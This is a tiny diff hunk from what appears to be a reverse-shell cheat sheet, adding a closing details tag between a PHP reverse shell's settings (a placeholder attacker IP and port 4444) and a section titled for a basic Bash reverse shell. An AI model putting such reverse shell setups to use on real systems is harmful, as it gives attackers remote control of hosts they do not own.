@@ -544,6 +544,7 @@ Edit the shell file:
 $ip = 'YOUR_KALI_IP';
 $port = 4444;
 ```
+</details>
 <details>
 <summary>🐚 Bash Reverse Shell (Basic)</summary>
 
